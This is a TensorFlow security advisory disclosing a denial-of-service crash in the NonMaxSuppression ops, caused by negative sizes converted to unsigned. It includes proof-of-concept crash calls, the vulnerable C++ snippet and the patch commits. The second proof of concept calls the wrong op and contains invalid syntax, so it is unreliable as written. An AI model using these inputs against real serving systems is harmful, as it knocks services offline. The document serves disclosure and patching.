# Crash in NMS ops caused by integer conversion to unsigned

High

[mihaimaruseac](/mihaimaruseac)
published
GHSA-vmjw-c2vp-p33c
Aug 11, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.6.0

## Patched versions

2.3.4, 2.4.3, 2.5.1

## Description

### Impact

An attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:

```
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],
  scores=[1.0,2.0,3.0],
  max_output_size=-1,
  iou_threshold=0.5,
  score_threshold=0.5,
  soft_nms_sigma=1.0,
  pad_to_max_output_size=True)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:

```
  const int output_size = max_output_size.scalar<int>()();
  // ...
  std::vector<int> selected;
  // ...
  if (pad_to_max_output_size) {
    selected.resize(output_size, 0);
    // ...
  }
```

However, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.

A similar issue occurs in `CombinedNonMaxSuppression`:

```
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],
  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],
  max_output_size_per_class=-1,
  max_total_size=10,
  iou_threshold=score_threshold=0.5,
  pad_per_class=True,
  clip_boxes=True)
```
### Patches

We have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
